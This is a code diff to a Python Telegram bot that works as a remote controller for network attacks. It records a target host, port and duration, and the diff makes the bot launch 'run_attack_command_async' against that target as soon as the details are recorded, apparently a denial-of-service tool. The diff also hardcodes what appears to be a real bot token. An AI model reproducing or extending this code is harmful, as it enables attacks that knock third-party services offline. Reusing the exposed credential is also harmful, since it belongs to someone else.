@@ -4,10 +4,12 @@ import time
 import os
 from subprocess import PIPE
 import asyncio
+from threading import Thread  # Import Thread from threading module
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 # Initialize asyncio event loop
-loop = asyncio.get_event_loop()
+loop = asyncio.new_event_loop()  # Create a new event loop
+asyncio.set_event_loop(loop)
 
 TOKEN = '7031476424:AAG6bW4N65VCpxyOgdjiWQ6FYbVnGal2uXY'
 USER_ID = 1165523648  # Replace with your actual user ID
@@ -80,7 +82,7 @@ def handle_message(message):
                 # Use the default duration if set
                 duration = default_duration or attack_details['duration']
                 # Send immediate message before starting the attack
-                bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {attack_details['ip']}\nPort: {attack_details['port']}\nTime: {duration}*", parse_mode='Markdown')
+                bot.send_message(message.chat.id, f"*Attack started again💥\n\nHost: {attack_details['ip']}\nPort: {attack_details['port']}\nTime: {duration}*", parse_mode='Markdown')
                 asyncio.run_coroutine_threadsafe(run_attack_command_async(attack_details['ip'], attack_details['port'], duration), loop)
             else:
                 bot.send_message(message.chat.id, "*Please record attack details first using the 'Record 📝' button.*", parse_mode='Markdown')
@@ -109,7 +111,14 @@ def record_attack_details(message):
             attack_details['duration'] = duration
             default_duration = duration  # Set default duration to the newly recorded duration
 
+            # Notify that the details are recorded
             bot.send_message(message.chat.id, f"*Attack details recorded 💾\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
+
+            # Immediately start the attack after recording details
+            bot.send_message(message.chat.id, f"*Attack started immediately 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
+            
+            # Use run_in_executor to run async function in the background
+            asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
 
     except Exception as e:
         logging.error(f"Error in recording attack details: {e}")
@@ -130,8 +139,9 @@ if __name__ == "__main__":
     def start_asyncio_thread():
         loop.run_forever()
 
-    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)  # Create a new thread for the event loop
     asyncio_thread.start()
+    
     logging.info("Starting Telegram bot...")
     while True:
         try:
